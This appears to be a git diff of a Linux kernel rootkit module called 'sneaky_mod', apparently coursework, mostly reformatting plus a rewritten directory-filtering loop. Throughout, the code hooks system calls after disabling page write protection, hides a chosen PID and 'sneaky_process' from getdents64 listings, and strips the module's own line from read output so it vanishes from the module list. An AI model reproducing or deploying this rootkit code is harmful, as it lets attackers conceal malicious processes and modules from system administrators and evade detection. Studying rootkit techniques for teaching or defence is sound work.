@@ -1,15 +1,15 @@
 #include <asm/cacheflush.h>
 #include <asm/current.h>  // process information
 #include <asm/page.h>
-#include <asm/unistd.h>     // for system call constants
+#include <asm/unistd.h>  // for system call constants
+#include <linux/dirent.h>
 #include <linux/highmem.h>  // for changing page permissions
 #include <linux/init.h>     // for entry/exit macros
 #include <linux/kallsyms.h>
 #include <linux/kernel.h>  // for printk and other kernel bits
 #include <linux/module.h>  // for all modules
 #include <linux/sched.h>
-#include <linux/dirent.h>
-//import for ssize_t
+// import for ssize_t
 #include <linux/fs.h>
 
 #define PREFIX "sneaky_process"
@@ -36,7 +36,6 @@ int disable_page_rw(void *ptr) {
     pte->pte = pte->pte & ~_PAGE_RW;
     return 0;
 }
-
 
 // 1. Function pointer will be used to save address of the original 'openat' syscall.
 // 2. The asmlinkage keyword is a GCC #define that indicates this function
@@ -66,17 +65,17 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs) {
 
 asmlinkage int (*original_getdents64)(struct pt_regs *regs);
 
-static char * sneaky_pid = "";
+static char *sneaky_pid = "";
 module_param(sneaky_pid, charp, 0);
 
 /**
  * @brief isSneakyProcess is a helper function to check if the process is sneaky_process
-*/
+ */
 bool isSneakyProcess(struct linux_dirent64 *dirent) {
-	if (strcmp(dirent->d_name, sneaky_pid) == 0 || strcmp(dirent->d_name, PREFIX) == 0) {
-		return true;
-	}
-	return false;
+    if (strcmp(dirent->d_name, sneaky_pid) == 0 || strcmp(dirent->d_name, PREFIX) == 0) {
+        return true;
+    }
+    return false;
 }
 
 /**
@@ -85,35 +84,32 @@ bool isSneakyProcess(struct linux_dirent64 *dirent) {
  * into a buffer in user space. The sneaky version would ignore the snkeay_process
  */
 asmlinkage int sneaky_getdents64(struct pt_regs *regs) {
-	//call original getdents64, and save bytes 
-	int length = original_getdents64(regs);
+    // call original getdents64, and save bytes
+    int length = original_getdents64(regs);
 
-	// get the start address of the linux_dirent struct
-	struct linux_dirent64 *dirent = (struct linux_dirent64 *)regs->si;
+    // get the start address of the linux_dirent struct
+    struct linux_dirent64 *dirent = (struct linux_dirent64 *)regs->si;
 
-	int offset = 0;
+    int offset = 0;
 
-	if (isSneakyProcess(dirent)) {
-		// if the first entry is sneaky_process, then skip it
-		offset += dirent->d_reclen;
-		// delete the sneaky_process from the buffer
-		memmove((char *)dirent, (char *)dirent + offset, length - dirent->d_reclen);
-    length -= dirent->d_reclen;
-	} else {
-		while (offset < length) {
-			struct linux_dirent64 *temp = (struct linux_dirent64 *)((char *)dirent + offset);
-			if (isSneakyProcess(temp)) {
-				// if the entry is sneaky_process, then skip it
-				//offset += temp->d_reclen;
-				// delete the sneaky_process from the buffer
-				memmove((char *)temp, (char *)temp + temp->d_reclen, length - temp->d_reclen - offset);
-				length -= temp->d_reclen;
-			} else {
-				offset += temp->d_reclen;
-			}
-		}
-	}
-	return length;
+    // if (isSneakyProcess(dirent)) {
+    // 	// if the first entry is sneaky_process, then skip it
+    // 	offset += dirent->d_reclen;
+    // 	// delete the sneaky_process from the buffer
+    // 	memmove((char *)dirent, (char *)dirent + offset, length - dirent->d_reclen);
+    //   length -= dirent->d_reclen;
+    // } else {
+    while (offset < length) {
+        struct linux_dirent64 *temp = (struct linux_dirent64 *)((char *)dirent + offset);
+        if (isSneakyProcess(temp)) {
+            // delete the sneaky_process from the buffer
+            memmove((void *)temp, (void *)temp + temp->d_reclen, length - temp->d_reclen - offset);
+            length -= temp->d_reclen;
+        } else {
+            offset += temp->d_reclen;
+        }
+    }
+    return length;
 }
 
 // asmlinkage int sneaky_sys_getdents64(struct pt_regs* regs){
@@ -137,8 +133,6 @@ asmlinkage int sneaky_getdents64(struct pt_regs *regs) {
 //   return totalDirpLength;
 // }
 
-
-
 // asmlinkage ssize_t (*original_read)(struct pt_regs *regs);
 
 // char * findPos(char* start, const char * target, ssize_t length) {
@@ -160,34 +154,30 @@ asmlinkage int sneaky_getdents64(struct pt_regs *regs) {
 //     return length;
 // }
 
-
-
-asmlinkage ssize_t (*original_read)(struct pt_regs*);
+asmlinkage ssize_t (*original_read)(struct pt_regs *);
 
 /**
  * @brief sneaky read
- * 
- * @param regs 
- * @return asmlinkage 
+ *
+ * @param regs
+ * @return asmlinkage
  */
-asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs){
-  ssize_t bytesRead = original_read(regs);
+asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs) {
+    ssize_t bytesRead = original_read(regs);
 
-  if(bytesRead > 0){
-    void* posStart = strnstr((char*)(regs->si), "sneaky_mod", bytesRead);
-    if(posStart != NULL){
-      void* posEnd = strnstr(posStart, "\n", bytesRead - (posStart - (void*)(regs->si)));
-      if(posEnd != NULL){
-        int size = posEnd - posStart + 1;
-        memmove(posStart, posEnd + 1, bytesRead - (posStart - (void*)(regs->si)) - size);
-        bytesRead -= size;
-      }
+    if (bytesRead > 0) {
+        void *posStart = strnstr((char *)(regs->si), "sneaky_mod", bytesRead);
+        if (posStart != NULL) {
+            void *posEnd = strnstr(posStart, "\n", bytesRead - (posStart - (void *)(regs->si)));
+            if (posEnd != NULL) {
+                int size = posEnd - posStart + 1;
+                memmove(posStart, posEnd + 1, bytesRead - (posStart - (void *)(regs->si)) - size);
+                bytesRead -= size;
+            }
+        }
     }
-  }
-  return bytesRead;
+    return bytesRead;
 }
-
-
 
 // The code that gets executed when the module is loaded
 static int initialize_sneaky_module(void) {
